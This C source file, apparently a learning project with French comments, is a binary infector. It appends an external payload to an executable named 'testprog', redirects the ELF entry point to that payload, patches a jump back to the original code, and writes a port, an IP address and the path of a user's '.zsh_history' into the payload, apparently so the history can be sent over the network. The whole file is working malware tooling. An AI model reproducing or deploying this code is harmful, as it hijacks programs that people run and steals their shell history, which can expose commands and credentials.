#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

uint16_t port = 0;
uint32_t addr_ip = 0;

int main(int argc, char *argv[], char *envp[])
{
    port = htons(3002);
    addr_ip = htonl(INADDR_ANY);
    printf("port: %#x %#x\n", port, addr_ip);

    int fd = open("testprog", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("payload size: %p, %#lx\n", payload_p, payload_size_p);

    size_t size = lseek(fd, 0, SEEK_END);
    if (size == (size_t) -1) {
        perror("lseek");
        close(fd);
        return 1;
    }
    printf("size of the file: %zu\n", size);

    // Agrandir le fichier pour accueillir les nouvelles données
    if (ftruncate(fd, size + payload_size_p) == -1) {
        perror("ftruncate");
        close(fd);
        return 1;
    }

    // Lire le header du fichier
    uint8_t header[64];
    if (pread(fd, header, sizeof(header), 0) != sizeof(header)) {
        perror("pread");
        close(fd);
        return 1;
    }

    uint32_t entry_point_offset = 0x18;
    uint64_t entry_point = *(uint64_t *)(header + entry_point_offset);

    printf("entry point: %#lx\n", entry_point);

    // Ecrire le payload à la fin du fichier
    if (pwrite(fd, payload_p, payload_size_p, size) != payload_size_p) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Ecrire le port et l'adresse IP dans le payload
    if (pwrite(fd, &port, sizeof(port), size + payload_size_p - 4 - 2) != sizeof(port)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

	char *filepath = "/home/maxence/.zsh_history";
    if (pwrite(fd, filepath, sizeof(filepath), size + payload_size_p - 4 - 2 - 1024) != sizeof(filepath)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    if (pwrite(fd, &addr_ip, sizeof(addr_ip), size + payload_size_p - 4) != sizeof(addr_ip)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Mettre à jour le point d'entrée dans le header
    uint32_t new_entry_point = size;
    memcpy(header + entry_point_offset, &new_entry_point, sizeof(new_entry_point));

    // Ecrire le nouveau header dans le fichier
    if (pwrite(fd, header, sizeof(header), 0) != sizeof(header)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Mettre à jour le saut dans le payload
    uint64_t jump = entry_point - (size + 4);
    if (pwrite(fd, &jump, sizeof(jump), size + payload_size_p - 4 - 2 - 8) != sizeof(jump)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    printf("Modification completed successfully.\n");

    close(fd);

    return 0;
}
